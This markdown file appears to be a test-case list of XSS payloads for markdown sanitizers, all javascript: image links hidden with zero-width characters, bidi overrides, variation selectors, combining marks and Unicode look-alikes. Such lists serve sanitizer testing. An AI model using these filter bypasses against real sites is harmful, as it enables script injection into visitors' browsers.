# Boundary Character Attacks

## Characters at markdown processing boundaries
![](javascript:alert('xss')​)
![](javascript:alert('xss')‌)
![](javascript:alert('xss')‍)
![](javascript:alert('xss')﻿)

## Invisible separators in URLs
![](java​script:alert('zwsp'))
![](java‌script:alert('zwnj'))  
![](java‍script:alert('zwj'))
![](java﻿script:alert('bom'))

## Line separator characters in URLs
![](javascript:
alert('line-sep'))
![](javascript:alert('paragraph-sep'))

## High surrogate characters
![](𝒿𝒶𝓋𝒶𝓈𝒸𝓇𝒾𝓅𝓉:alert('high-surrogates'))
![](🅹🅰🆅🅰🆂🅲🆁🅸🅿🆃:alert('emoji-like'))

## Variation selectors
![](javascript︀:alert('vs1'))
![](javascript︁:alert('vs2'))
![](javascript︎:alert('vs15'))
![](javascript️:alert('vs16'))

## Combining characters
![](jav͏ascript:alert('combining'))
![](java͡script:alert('tie'))
![](javas̸cript:alert('strikethrough'))

## Bidirectional override combinations
![](‮tpircsavaj‬:alert('bidi'))
![](‭javascript:alert('embed')‬)

## Normalization form variations
![](javascript:alert('NFC'))
![](javascript:alert('NFD'))
![](javascript:alert('NFKC'))  
![](javascript:alert('NFKD'))